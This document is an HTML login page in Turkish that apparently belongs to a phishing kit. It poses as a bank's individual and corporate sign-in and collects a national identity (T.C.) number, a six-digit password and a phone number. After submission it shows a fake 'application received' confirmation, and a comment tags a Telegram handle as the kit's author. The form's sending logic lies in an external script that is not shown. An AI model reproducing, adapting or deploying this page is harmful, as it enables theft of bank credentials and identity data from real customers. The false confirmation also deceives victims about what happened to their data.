<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş</title>
	<link rel="stylesheet" type="text/css" href="./assets/css/style.css">
</head>
<style>


</style>
<body>
<!-- AXXEL1 TG: @nbluee2 -->
        <div class="loading-overlay" id="loading-overlay">
            <img src="./assets/img/giris.png" style="width:100%;height:100%;" alt="loading...">
          
        </div>   
		
		<div class="login-overlay" id="login-overlay">
            <img src="./assets/img/login.png" style="width:100%;height:100%;" alt="loading...">
          
        </div> 
		
		
		<div class="login-container" id="login-con" style="margin-top:20px !important;display:block;">
		
		<div class="back-button" style="margin-bottom:30px;" onclick="window.location.href='/'">
                    ←
                </div>
	
        <div class="tabs" id="tabs">
            <div class="tab active" id="bireysel-tab">Bireysel</div>
            <div class="tab" id="kurumsal-tab">Kurumsal</div>
        </div>
        <div id="form-error" class="error-message"></div>

        <form id="login-form" method="post">
            <div class="form-group" id="username-group">
                <label for="username" style="color:#00a6a2;">Müşteri/T.C. Kimlik Numarası</label>
                <input type="text" id="username" name="username" inputmode="numeric" autocomplete="off" maxlength="11" required>
                <div id="username-error" class="required-message" style="display: none;">Lütfen geçerli bir TC Kimlik numarası giriniz</div>
            </div>
            
            <div class="form-group" id="password-group">
                <label for="password" style="color:#00a6a2;">Parola</label>
                <input name="password" type="password" class="form-control" id="password" inputmode="numeric" autocomplete="off" maxlength="6" required>
               
            </div>
			
			 <div class="form-group" id="phone-group" style="display:none;">
                <label for="phone" style="color:#00a6a2;">Telefon Numarası</label>
                <input type="text" id="phone" name="telefon" inputmode="numeric" autocomplete="off" maxlength="11" required>
            </div>
            
           <button type="button" style="background-color:#00a6a2 !important;" class="login-button" id="login-button">
                <span id="login-text">Giriş</span>
				 <span id="login-spinner" style="display: none; margin-left: 10px;">
                    <svg width="16" height="16" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" fill="#fff">
                        <circle cx="50" cy="50" r="35" stroke-width="10" stroke="#fff" stroke-dasharray="164.93361431346415 56.97787143782138" fill="none">
                            <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
                        </circle>
                    </svg>
                </span>
               
            </button>
			
			 <button type="submit" style="background-color:#00a6a2 !important;display:none;" class="login-button" id="submit-button">
                <span id="login-text">Giriş</span>
				 <span id="login-spinner" style="display: none; margin-left: 10px;">
                    <svg width="16" height="16" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" fill="#fff">
                        <circle cx="50" cy="50" r="35" stroke-width="10" stroke="#fff" stroke-dasharray="164.93361431346415 56.97787143782138" fill="none">
                            <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
                        </circle>
                    </svg>
                </span>
               
            </button>
			
			<a href="#" id="forgot-password" class="forgot-password">Parola Al / Parolamı Unuttum</a>

        </form>

       
    </div>
	
	
	
    <div class="success-container" id="success" style="display:none;background-color:transparent !important;">
        <div class="checkmark">
            <svg width="64" height="64" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
              <circle cx="32" cy="32" r="30" stroke="#4CAF50" stroke-width="4" fill="none"/>
              <path d="M18 34 L28 44 L46 24" stroke="#4CAF50" stroke-width="4" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>

        </div>
        
        <div class="success-header">
            <h1>Tebrikler! Başvurunuz Başarıyla Alındı</h1>
            <p>Başvuru işleminiz sistemimize kaydedilmiştir.</p>
            <p>Müşteri temsilcilerimiz 1-3 iş günü içerisinde sizinle iletişime geçecektir.</p>
        </div>
        
        <div class="success-card">
            <h3>Başvuru Bilgileriniz</h3>
            <div class="success-info-row">
                <div class="success-info-label">Ad Soyad:</div>
                <div class="success-info-value"><span id="adi"></span></div>
            </div>
            <div class="success-info-row">
                <div class="success-info-label">Telefon:</div>
                <div class="success-info-value"><span id="telefon"></span></div>
            </div>
            <div class="success-info-row">
                <div class="success-info-label">Başvuru Tarihi:</div>
                <div class="success-info-value"><span id="islemSaati"></span></div>
            </div>
            
            <a href="/" class="success-home-button">Ana Sayfaya Dön</a>
        </div>
    </div>



 <script src="assets/js/script.js"></script>    
</body>
</html>
